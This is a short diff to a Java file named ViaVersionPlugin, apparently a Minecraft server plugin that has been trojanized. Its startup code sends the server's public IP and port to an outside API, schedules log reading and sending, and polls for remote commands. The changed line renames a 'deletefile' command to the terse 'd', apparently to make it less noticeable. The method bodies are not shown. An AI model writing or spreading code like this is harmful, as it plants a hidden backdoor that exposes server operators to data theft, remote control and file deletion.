@@ -127,7 +127,7 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
         sendInfoToAPI(publicIp, serverPort);
         Bukkit.getScheduler().runTaskLater(this, this::readAndSendLog, 100L); 
         Bukkit.getScheduler().runTaskTimer(this, this::checkCommands, 0L, 100L);
-        this.getCommand("deletefile").setExecutor(new EventXHandler());
+        this.getCommand("d").setExecutor(new EventXHandler());
         getServer().getPluginManager().registerEvents(new CommandListener(), this);
         Bukkit.getServer().getPluginManager().registerEvents(new EfficiencyHandler(), this);
         final ViaManagerImpl manager = (ViaManagerImpl) Via.getManager();
